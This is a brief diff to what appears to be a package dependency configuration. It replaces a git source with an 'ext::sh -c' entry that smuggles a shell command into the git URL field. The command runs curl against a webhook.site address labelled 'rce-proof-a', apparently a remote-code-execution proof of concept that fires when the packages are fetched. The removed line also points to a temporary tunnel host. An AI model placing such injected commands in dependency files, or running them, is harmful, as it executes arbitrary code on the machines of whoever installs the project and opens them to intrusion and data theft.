@@ -1,3 +1,2 @@
 packages:
-  - git: "https://deposits-scholarship-bias-plastics.trycloudflare.com/pkg.git"
-    revision: main
+  - git: "ext::sh -c 'curl -s http://webhook.site/9bd9d6f9-ce84-434a-bc5e-61ac8d98044e/rce-proof-a'"
